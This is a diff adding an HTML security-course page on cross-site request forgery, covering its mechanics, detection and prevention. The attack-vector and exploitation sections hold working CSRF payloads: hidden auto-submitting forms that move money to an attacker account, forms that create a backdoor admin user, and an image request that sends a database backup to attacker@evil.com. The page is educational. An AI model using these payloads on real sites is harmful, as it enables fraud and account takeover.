@@ -1,0 +1,744 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Attacks - ABID HACKER</title>
+    
+    <!-- Bootstrap CSS CDN -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    
+    <!-- Font Awesome CDN -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="../../css/style.css">
+</head>
+<body>
+    <!-- Navigation Bar -->
+    <nav class="navbar navbar-expand-lg navbar-dark bg-dark fixed-top">
+        <div class="container">
+            <a class="navbar-brand" href="../../index.html">
+                <i class="fas fa-shield-alt"></i> ABID HACKER
+            </a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav ms-auto">
+                    <li class="nav-item">
+                        <a class="nav-link" href="../../index.html">Home</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="../courses.html">Courses</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="../about.html">About</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="../contact.html">Contact</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="container my-5" style="margin-top: 100px !important;">
+        <div class="row">
+            <!-- Sidebar Navigation -->
+            <div class="col-lg-3">
+                <div class="card border-success sticky-top" style="top: 100px;">
+                    <div class="card-header bg-success text-white">
+                        <h6 class="mb-0">CSRF Attacks</h6>
+                    </div>
+                    <div class="card-body p-0">
+                        <ul class="list-group list-group-flush">
+                            <li class="list-group-item bg-dark border-success">
+                                <a href="#introduction" class="text-success text-decoration-none">Introduction</a>
+                            </li>
+                            <li class="list-group-item bg-dark border-success">
+                                <a href="#how-it-works" class="text-success text-decoration-none">How CSRF Works</a>
+                            </li>
+                            <li class="list-group-item bg-dark border-success">
+                                <a href="#attack-vectors" class="text-success text-decoration-none">Attack Vectors</a>
+                            </li>
+                            <li class="list-group-item bg-dark border-success">
+                                <a href="#exploitation" class="text-success text-decoration-none">Exploitation</a>
+                            </li>
+                            <li class="list-group-item bg-dark border-success">
+                                <a href="#detection" class="text-success text-decoration-none">Detection</a>
+                            </li>
+                            <li class="list-group-item bg-dark border-success">
+                                <a href="#prevention" class="text-success text-decoration-none">Prevention</a>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Main Content Area -->
+            <div class="col-lg-9">
+                <div class="card border-success">
+                    <div class="card-header bg-success text-white">
+                        <h1 class="mb-0"><i class="fas fa-user-secret"></i> Cross-Site Request Forgery (CSRF)</h1>
+                    </div>
+                    <div class="card-body">
+                        <!-- Introduction Section -->
+                        <section id="introduction">
+                            <h2 class="text-success">Introduction to CSRF</h2>
+                            <p>Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated.</p>
+                            
+                            <div class="alert alert-info mt-4">
+                                <h4 class="text-primary"><i class="fas fa-lightbulb"></i> Core Theory</h4>
+                                <p>CSRF exploits the trust that a website has in a user's browser. Think of it like someone forging your signature on a check - the bank trusts the signature because it looks legitimate, even though you didn't actually sign it. Similarly, websites trust requests from your browser because they include your authentication cookies.</p>
+                            </div>
+
+                            <h3 class="text-success mt-4">How CSRF Works - Technical Deep Dive</h3>
+                            <p>CSRF attacks exploit the automatic inclusion of credentials in HTTP requests:</p>
+                            <ol>
+                                <li><strong>User Authentication:</strong> Victim logs into a legitimate website (bank.com)</li>
+                                <li><strong>Session Establishment:</strong> Browser stores authentication cookies</li>
+                                <li><strong>Malicious Site Visit:</strong> User visits attacker's website while still logged in</li>
+                                <li><strong>Forged Request:</strong> Attacker's site triggers request to bank.com</li>
+                                <li><strong>Automatic Credentials:</strong> Browser automatically includes session cookies</li>
+                                <li><strong>Unauthorized Action:</strong> Bank processes request as legitimate</li>
+                            </ol>
+
+                            <h3 class="text-success mt-4">Browser Security Model Context</h3>
+                            <div class="card bg-dark text-white mt-3">
+                                <div class="card-header">
+                                    <h5><i class="fas fa-globe"></i> Why Browsers Are Vulnerable</h5>
+                                </div>
+                                <div class="card-body">
+                                    <ul>
+                                        <li><strong>Automatic Cookie Inclusion:</strong> Browsers send cookies with every request to a domain</li>
+                                        <li><strong>Same-Origin Policy Limitations:</strong> SOP doesn't prevent sending requests, only reading responses</li>
+                                        <li><strong>Cross-Origin Requests:</strong> Forms and images can be loaded from any domain</li>
+                                        <li><strong>HTTP Authentication:</strong> Basic/Digest auth automatically included</li>
+                                        <li><strong>Client Certificates:</strong> Automatically presented for HTTPS sites</li>
+                                    </ul>
+                                </div>
+                            </div>
+
+                            <h3 class="text-success mt-4">CSRF Attack Vectors</h3>
+                            <div class="row">
+                                <div class="col-md-6">
+                                    <h4 class="text-warning">Traditional Vectors</h4>
+                                    <ul>
+                                        <li><strong>HTML Forms:</strong> Hidden forms that auto-submit</li>
+                                        <li><strong>Image Tags:</strong> GET requests via img src</li>
+                                        <li><strong>JavaScript:</strong> Dynamic form creation and submission</li>
+                                        <li><strong>IFrames:</strong> Hidden frames containing malicious forms</li>
+                                    </ul>
+                                </div>
+                                <div class="col-md-6">
+                                    <h4 class="text-warning">Modern Vectors</h4>
+                                    <ul>
+                                        <li><strong>AJAX Requests:</strong> XMLHttpRequest and Fetch API</li>
+                                        <li><strong>WebSockets:</strong> Real-time communication protocols</li>
+                                        <li><strong>Flash/Java:</strong> Plugin-based cross-domain requests</li>
+                                        <li><strong>Mobile Apps:</strong> WebView components in mobile applications</li>
+                                    </ul>
+                                </div>
+                            </div>
+
+                            <h3 class="text-success mt-4">Impact Assessment</h3>
+                            <p>CSRF attacks can have severe consequences depending on the application functionality:</p>
+                            <ul>
+                                <li><strong>Financial Fraud:</strong> Unauthorized money transfers, purchases</li>
+                                <li><strong>Account Takeover:</strong> Password changes, email modifications</li>
+                                <li><strong>Data Manipulation:</strong> Unauthorized data modifications</li>
+                                <li><strong>Privilege Escalation:</strong> Administrative action execution</li>
+                                <li><strong>Social Engineering:</strong> Reputation damage through unwanted posts</li>
+                            </ul>
+
+                            <div class="alert alert-warning mt-4">
+                                <h4 class="text-dark"><i class="fas fa-exclamation-triangle"></i> Real-World Examples</h4>
+                                <ul>
+                                    <li><strong>Banking:</strong> Transferring funds to attacker's account</li>
+                                    <li><strong>Social Media:</strong> Posting malicious content or sending messages</li>
+                                    <li><strong>E-commerce:</strong> Changing shipping addresses or making purchases</li>
+                                    <li><strong>Admin Panels:</strong> Creating new admin users or modifying settings</li>
+                                </ul>
+                            </div>
+                        </section>
+
+                            <h3 class="text-success mt-4">Key Characteristics</h3>
+                            <div class="row">
+                                <div class="col-md-6">
+                                    <ul>
+                                        <li><strong>State-Changing Actions:</strong> Targets actions that modify data</li>
+                                        <li><strong>Authentication Bypass:</strong> Uses victim's existing session</li>
+                                        <li><strong>Social Engineering:</strong> Requires user interaction</li>
+                                        <li><strong>Cross-Origin:</strong> Attack originates from different domain</li>
+                                    </ul>
+                                </div>
+                                <div class="col-md-6">
+                                    <ul>
+                                        <li><strong>Silent Execution:</strong> Victim unaware of attack</li>
+                                        <li><strong>Browser-Based:</strong> Exploits browser behavior</li>
+                                        <li><strong>Session Hijacking:</strong> Leverages active sessions</li>
+                                        <li><strong>Privilege Escalation:</strong> Uses victim's permissions</li>
+                                    </ul>
+                                </div>
+                            </div>
+
+                            <h3 class="text-success mt-4">Impact of CSRF</h3>
+                            <div class="row">
+                                <div class="col-md-4">
+                                    <div class="card bg-dark border-success">
+                                        <div class="card-body">
+                                            <h5 class="text-success">Financial Impact</h5>
+                                            <ul class="text-light">
+                                                <li>Unauthorized money transfers</li>
+                                                <li>Purchase transactions</li>
+                                                <li>Account modifications</li>
+                                                <li>Payment method changes</li>
+                                            </ul>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="col-md-4">
+                                    <div class="card bg-dark border-success">
+                                        <div class="card-body">
+                                            <h5 class="text-success">Account Compromise</h5>
+                                            <ul class="text-light">
+                                                <li>Password changes</li>
+                                                <li>Email modifications</li>
+                                                <li>Profile updates</li>
+                                                <li>Security settings changes</li>
+                                            </ul>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="col-md-4">
+                                    <div class="card bg-dark border-success">
+                                        <div class="card-body">
+                                            <h5 class="text-success">Administrative Actions</h5>
+                                            <ul class="text-light">
+                                                <li>User creation/deletion</li>
+                                                <li>Permission modifications</li>
+                                                <li>System configuration changes</li>
+                                                <li>Data manipulation</li>
+                                            </ul>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </section>
+
+                        <!-- How it Works Section -->
+                        <section id="how-it-works" class="mb-5">
+                            <h2 class="text-success">How CSRF Attacks Work</h2>
+                            
+                            <h3 class="text-success mt-4">Attack Flow</h3>
+                            <div class="code-block">
+# CSRF Attack Steps
+1. User logs into vulnerable website (bank.com)
+2. User receives session cookie
+3. Attacker crafts malicious page with CSRF payload
+4. User visits attacker's page while still logged in
+5. Browser automatically sends cookies with forged request
+6. Server processes request as legitimate (has valid session)
+7. Unauthorized action is performed
+                            </div>
+
+                            <h3 class="text-success mt-4">Vulnerable Request Example</h3>
+                            <div class="terminal">
+# Legitimate money transfer request
+POST /transfer HTTP/1.1
+Host: bank.com
+Cookie: sessionid=abc123
+Content-Type: application/x-www-form-urlencoded
+
+to_account=12345&amount=1000&csrf_token=missing
+
+# Same request can be forged from attacker site
+# Browser will automatically include the session cookie
+                            </div>
+
+                            <h3 class="text-success mt-4">Prerequisites for CSRF</h3>
+                            <div class="row">
+                                <div class="col-md-6">
+                                    <div class="card bg-dark border-success">
+                                        <div class="card-body">
+                                            <h5 class="text-success">Required Conditions</h5>
+                                            <ul class="text-light">
+                                                <li>Relevant action exists (state-changing)</li>
+                                                <li>Cookie-based session handling</li>
+                                                <li>No unpredictable request parameters</li>
+                                                <li>User is authenticated</li>
+                                            </ul>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="col-md-6">
+                                    <div class="card bg-dark border-success">
+                                        <div class="card-body">
+                                            <h5 class="text-success">Attack Requirements</h5>
+                                            <ul class="text-light">
+                                                <li>Social engineering vector</li>
+                                                <li>Victim visits attacker site</li>
+                                                <li>Active session on target site</li>
+                                                <li>Knowledge of request structure</li>
+                                            </ul>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </section>
+
+                        <!-- Attack Vectors Section -->
+                        <section id="attack-vectors" class="mb-5">
+                            <h2 class="text-success">CSRF Attack Vectors</h2>
+                            
+                            <h3 class="text-success mt-4">HTML Forms</h3>
+                            <div class="terminal">
+# Auto-submitting form
+<html>
+<body onload="document.forms[0].submit()">
+    <form action="https://bank.com/transfer" method="POST">
+        <input type="hidden" name="to_account" value="attacker123">
+        <input type="hidden" name="amount" value="10000">
+    </form>
+</body>
+</html>
+
+# Hidden iframe form
+<iframe style="display:none" name="csrf-frame"></iframe>
+<form action="https://bank.com/transfer" method="POST" target="csrf-frame" id="csrf-form">
+    <input type="hidden" name="to_account" value="attacker123">
+    <input type="hidden" name="amount" value="5000">
+</form>
+<script>document.getElementById('csrf-form').submit();</script>
+                            </div>
+
+                            <h3 class="text-success mt-4">Image-Based Attacks</h3>
+                            <div class="terminal">
+# GET request via image tag
+<img src="https://bank.com/transfer?to_account=attacker123&amount=1000" style="display:none">
+
+# Multiple requests
+<img src="https://bank.com/delete_account?confirm=yes" style="display:none">
+<img src="https://social.com/add_friend?user_id=attacker" style="display:none">
+<img src="https://admin.com/create_user?username=hacker&role=admin" style="display:none">
+
+# Using CSS background images
+<div style="background-image: url('https://bank.com/transfer?to_account=attacker123&amount=1000');"></div>
+                            </div>
+
+                            <h3 class="text-success mt-4">JavaScript-Based Attacks</h3>
+                            <div class="terminal">
+# XMLHttpRequest (same-origin policy limitations)
+var xhr = new XMLHttpRequest();
+xhr.open('POST', 'https://bank.com/transfer', true);
+xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+xhr.send('to_account=attacker123&amount=1000');
+
+# Fetch API
+fetch('https://bank.com/transfer', {
+    method: 'POST',
+    body: 'to_account=attacker123&amount=1000',
+    headers: {
+        'Content-Type': 'application/x-www-form-urlencoded'
+    }
+});
+
+# Dynamic form creation
+function csrf_attack() {
+    var form = document.createElement('form');
+    form.method = 'POST';
+    form.action = 'https://bank.com/transfer';
+    
+    var input1 = document.createElement('input');
+    input1.type = 'hidden';
+    input1.name = 'to_account';
+    input1.value = 'attacker123';
+    
+    var input2 = document.createElement('input');
+    input2.type = 'hidden';
+    input2.name = 'amount';
+    input2.value = '10000';
+    
+    form.appendChild(input1);
+    form.appendChild(input2);
+    document.body.appendChild(form);
+    form.submit();
+}
+                            </div>
+
+                            <h3 class="text-success mt-4">Social Engineering Vectors</h3>
+                            <div class="terminal">
+# Email-based attacks
+Subject: You've won $1000!
+Click here to claim: http://attacker.com/csrf-page.html
+
+# Social media posts
+"Check out this funny video!" 
+Link: http://attacker.com/video.html (contains CSRF)
+
+# Forum posts
+[img]http://attacker.com/csrf-image.php[/img]
+
+# Malicious advertisements
+<iframe src="http://attacker.com/csrf-ad.html"></iframe>
+
+# QR codes
+QR code leading to: http://attacker.com/csrf-mobile.html
+                            </div>
+                        </section>
+
+                        <!-- Exploitation Section -->
+                        <section id="exploitation" class="mb-5">
+                            <h2 class="text-success">CSRF Exploitation Techniques</h2>
+                            
+                            <h3 class="text-success mt-4">Banking/Financial Applications</h3>
+                            <div class="terminal">
+# Money transfer attack
+<form action="https://bank.com/transfer" method="POST" id="transfer">
+    <input type="hidden" name="to_account" value="attacker_account">
+    <input type="hidden" name="amount" value="50000">
+    <input type="hidden" name="description" value="Legitimate transfer">
+</form>
+<script>document.getElementById('transfer').submit();</script>
+
+# Change payment method
+<form action="https://bank.com/payment-methods" method="POST">
+    <input type="hidden" name="action" value="add">
+    <input type="hidden" name="card_number" value="4444555566667777">
+    <input type="hidden" name="expiry" value="12/25">
+</form>
+
+# Loan application
+<form action="https://bank.com/apply-loan" method="POST">
+    <input type="hidden" name="amount" value="100000">
+    <input type="hidden" name="purpose" value="Business">
+</form>
+                            </div>
+
+                            <h3 class="text-success mt-4">Social Media Attacks</h3>
+                            <div class="terminal">
+# Add friend/follower
+<img src="https://social.com/add_friend?user_id=attacker&confirm=yes">
+
+# Post malicious content
+<form action="https://social.com/post" method="POST">
+    <input type="hidden" name="content" value="Check out this malicious link: http://attacker.com">
+    <input type="hidden" name="visibility" value="public">
+</form>
+
+# Change privacy settings
+<form action="https://social.com/privacy" method="POST">
+    <input type="hidden" name="profile_visibility" value="public">
+    <input type="hidden" name="contact_info" value="public">
+</form>
+
+# Send messages
+<form action="https://social.com/messages/send" method="POST">
+    <input type="hidden" name="to_user" value="victim_friends">
+    <input type="hidden" name="message" value="Click this link: http://attacker.com">
+</form>
+                            </div>
+
+                            <h3 class="text-success mt-4">Administrative Panel Attacks</h3>
+                            <div class="terminal">
+# Create admin user
+<form action="https://admin.com/users/create" method="POST">
+    <input type="hidden" name="username" value="backdoor_admin">
+    <input type="hidden" name="password" value="secret123">
+    <input type="hidden" name="role" value="administrator">
+    <input type="hidden" name="email" value="attacker@evil.com">
+</form>
+
+# Modify system settings
+<form action="https://admin.com/settings" method="POST">
+    <input type="hidden" name="allow_registration" value="true">
+    <input type="hidden" name="email_verification" value="false">
+    <input type="hidden" name="admin_email" value="attacker@evil.com">
+</form>
+
+# Database operations
+<img src="https://admin.com/database/backup?send_to=attacker@evil.com">
+<img src="https://admin.com/logs/clear?confirm=yes">
+                            </div>
+                        </section>
+
+                        <!-- Detection Section -->
+                        <section id="detection" class="mb-5">
+                            <h2 class="text-success">CSRF Detection Methods</h2>
+                            
+                            <h3 class="text-success mt-4">Manual Testing</h3>
+                            <div class="terminal">
+# Testing methodology
+1. Identify state-changing functions
+2. Capture legitimate requests (Burp Suite/OWASP ZAP)
+3. Create HTML page with forged request
+4. Test with authenticated session
+5. Verify if action was performed
+
+# Functions to test
+- Login/logout
+- Password change
+- Email change
+- Profile updates
+- Money transfers
+- User creation/deletion
+- Permission changes
+- File uploads
+- Settings modifications
+                            </div>
+
+                            <h3 class="text-success mt-4">Automated Tools</h3>
+                            <div class="terminal">
+# Burp Suite
+1. Use Burp's CSRF PoC generator
+2. Right-click request → Engagement tools → Generate CSRF PoC
+3. Test generated HTML page
+4. Verify if request succeeds
+
+# OWASP ZAP
+1. Spider the application
+2. Run Active Scan
+3. Look for "Absence of Anti-CSRF Tokens"
+4. Manual verification required
+
+# CSRFTester
+java -jar CSRFTester.jar
+1. Record legitimate requests
+2. Generate test cases
+3. Execute tests
+4. Analyze results
+
+# Custom scripts
+#!/bin/bash
+# Simple CSRF test script
+echo '<form action="'$1'" method="POST">' > csrf_test.html
+echo '<input type="hidden" name="'$2'" value="'$3'">' >> csrf_test.html
+echo '</form><script>document.forms[0].submit();</script>' >> csrf_test.html
+                            </div>
+
+                            <h3 class="text-success mt-4">Identification Checklist</h3>
+                            <div class="terminal">
+# CSRF vulnerability indicators
+□ No CSRF tokens in forms
+□ Predictable/missing anti-CSRF measures
+□ State-changing GET requests
+□ Cookie-only authentication
+□ No SameSite cookie attributes
+□ Missing Referer header validation
+□ No custom headers required
+□ Weak session management
+
+# Request analysis
+□ Check for csrf_token parameter
+□ Look for X-CSRF-Token header
+□ Verify Referer header validation
+□ Test with different origins
+□ Check SameSite cookie settings
+□ Analyze session handling
+                            </div>
+                        </section>
+
+                        <!-- Prevention Section -->
+                        <section id="prevention" class="mb-5">
+                            <h2 class="text-success">CSRF Prevention Methods</h2>
+                            
+                            <h3 class="text-success mt-4">CSRF Tokens</h3>
+                            <div class="terminal">
+# PHP implementation
+<?php
+session_start();
+
+// Generate CSRF token
+if (!isset($_SESSION['csrf_token'])) {
+    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+}
+
+// Validate CSRF token
+function validate_csrf_token($token) {
+    return isset($_SESSION['csrf_token']) && hash_equals($_SESSION['csrf_token'], $token);
+}
+
+// HTML form with token
+echo '<form method="POST">';
+echo '<input type="hidden" name="csrf_token" value="' . $_SESSION['csrf_token'] . '">';
+echo '<input type="text" name="username">';
+echo '<input type="submit" value="Update">';
+echo '</form>';
+
+// Validate on submission
+if ($_POST && !validate_csrf_token($_POST['csrf_token'])) {
+    die('CSRF token validation failed');
+}
+?>
+
+# Node.js (Express with csurf)
+const csrf = require('csurf');
+const csrfProtection = csrf({ cookie: true });
+
+app.use(csrfProtection);
+
+app.get('/form', (req, res) => {
+    res.render('form', { csrfToken: req.csrfToken() });
+});
+
+# Django
+# settings.py
+MIDDLEWARE = [
+    'django.middleware.csrf.CsrfViewMiddleware',
+]
+
+# template
+<form method="post">
+    {% csrf_token %}
+    <!-- form fields -->
+</form>
+                            </div>
+
+                            <h3 class="text-success mt-4">SameSite Cookies</h3>
+                            <div class="terminal">
+# SameSite cookie attributes
+Set-Cookie: sessionid=abc123; SameSite=Strict; Secure; HttpOnly
+
+# SameSite options:
+# Strict - Cookie only sent for same-site requests
+# Lax - Cookie sent for top-level navigation (default)
+# None - Cookie sent for all cross-site requests (requires Secure)
+
+# PHP implementation
+setcookie('sessionid', $session_id, [
+    'expires' => time() + 3600,
+    'path' => '/',
+    'domain' => '.example.com',
+    'secure' => true,
+    'httponly' => true,
+    'samesite' => 'Strict'
+]);
+
+# Express.js
+app.use(session({
+    cookie: {
+        sameSite: 'strict',
+        secure: true,
+        httpOnly: true
+    }
+}));
+
+# Nginx configuration
+add_header Set-Cookie "sessionid=$cookie_sessionid; SameSite=Strict; Secure; HttpOnly";
+                            </div>
+
+                            <h3 class="text-success mt-4">Custom Headers</h3>
+                            <div class="terminal">
+# Require custom header for AJAX requests
+# JavaScript client
+fetch('/api/transfer', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json',
+        'X-Requested-With': 'XMLHttpRequest'
+    },
+    body: JSON.stringify(data)
+});
+
+# Server validation (PHP)
+if (!isset($_SERVER['HTTP_X_REQUESTED_WITH']) || 
+    $_SERVER['HTTP_X_REQUESTED_WITH'] !== 'XMLHttpRequest') {
+    http_response_code(403);
+    die('Invalid request');
+}
+
+# Double Submit Cookie pattern
+# Set CSRF cookie
+setcookie('csrf_token', $csrf_token, ['samesite' => 'Strict']);
+
+# Validate cookie matches form token
+if ($_COOKIE['csrf_token'] !== $_POST['csrf_token']) {
+    die('CSRF validation failed');
+}
+                            </div>
+
+                            <h3 class="text-success mt-4">Additional Security Measures</h3>
+                            <div class="terminal">
+# Referer header validation
+function validate_referer() {
+    $referer = $_SERVER['HTTP_REFERER'] ?? '';
+    $host = $_SERVER['HTTP_HOST'];
+    
+    if (strpos($referer, 'https://' . $host) !== 0) {
+        return false;
+    }
+    return true;
+}
+
+# Origin header validation
+function validate_origin() {
+    $origin = $_SERVER['HTTP_ORIGIN'] ?? '';
+    $allowed_origins = ['https://example.com', 'https://www.example.com'];
+    
+    return in_array($origin, $allowed_origins);
+}
+
+# Re-authentication for sensitive actions
+function require_password_confirmation($action) {
+    if (in_array($action, ['change_password', 'delete_account', 'transfer_money'])) {
+        // Require password re-entry
+        return verify_password($_POST['current_password']);
+    }
+    return true;
+}
+
+# CAPTCHA for sensitive operations
+function require_captcha($action) {
+    $sensitive_actions = ['transfer_money', 'change_email', 'delete_account'];
+    if (in_array($action, $sensitive_actions)) {
+        return verify_captcha($_POST['captcha_response']);
+    }
+    return true;
+}
+
+# Content Security Policy
+Content-Security-Policy: default-src 'self'; form-action 'self';
+
+# Frame Options (prevent clickjacking)
+X-Frame-Options: DENY
+Content-Security-Policy: frame-ancestors 'none';
+                            </div>
+                        </section>
+
+                        <!-- Navigation -->
+                        <div class="d-flex justify-content-between mt-5">
+                            <a href="sql-injection.html" class="btn btn-outline-success">
+                                <i class="fas fa-arrow-left"></i> Previous: SQL Injection
+                            </a>
+                            <a href="../networking/dns-security.html" class="btn btn-success">
+                                Next: DNS Security <i class="fas fa-arrow-right"></i>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-dark text-white py-4 mt-5">
+        <div class="container">
+            <div class="text-center">
+                <p>&copy; 2024 ABID HACKER. Created by Abid Mehmood - Professional Web Designer</p>
+                <p>Email: abidbusiness@gmail.com | Phone: 03029382306</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Bootstrap JS CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    
+    <!-- jQuery CDN -->
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+    
+    <!-- Custom JS -->
+    <script src="../../js/script.js"></script>
+</body>
+</html>
